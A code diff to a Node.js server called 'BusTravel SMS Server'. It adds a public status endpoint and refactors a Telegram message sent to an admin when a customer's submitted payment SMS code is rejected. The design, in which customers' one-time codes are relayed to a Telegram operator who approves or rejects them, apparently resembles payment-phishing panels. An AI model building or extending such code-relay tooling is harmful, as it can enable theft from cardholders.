@@ -146,6 +146,26 @@ app.get('/health', (req, res) => {
   });
 });
 
+// API status endpoint
+app.get('/api/status', (req, res) => {
+  res.json({
+    status: 'OK',
+    timestamp: new Date().toISOString(),
+    server: 'BusTravel SMS Server',
+    version: '2.1.0',
+    baseURL: BASE_URL,
+    endpoints: {
+      webhook: '/webhook',
+      health: '/health',
+      createSession: '/api/payment/create-session',
+      verifySMS: '/api/payment/verify-sms',
+      events: '/api/payment/events/:bookingId'
+    },
+    environment: IS_PRODUCTION ? 'production' : 'development',
+    activeSessions: paymentSessions.size
+  });
+});
+
 // Webhook endpoint for Telegram
 app.post('/webhook', (req, res) => {
   console.log('📨 Webhook received:', JSON.stringify(req.body, null, 2));
@@ -307,9 +327,12 @@ async function handleRejectCode(bookingId, chatId, callbackId) {
   session.codeSubmittedAt = null;
   paymentSessions.set(bookingId, session);
   
+  // Store the rejected code for display
+  const rejectedCode = session.receivedSmsCode;
+  
   // Notify Telegram admin
   await sendTelegramMessage(chatId, 
-    `❌ Код отклонен\n\n📱 Код был: <code>${session.receivedSmsCode || 'неизвестен'}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🔄 Клиент может ввести новый код`,
+    `❌ Код отклонен\n\n📱 Код был: <code>${rejectedCode || 'неизвестен'}</code>\n🆔 ID заказа: <code>${bookingId}</code>\n🔄 Клиент может ввести новый код`,
     'HTML'
   );
   
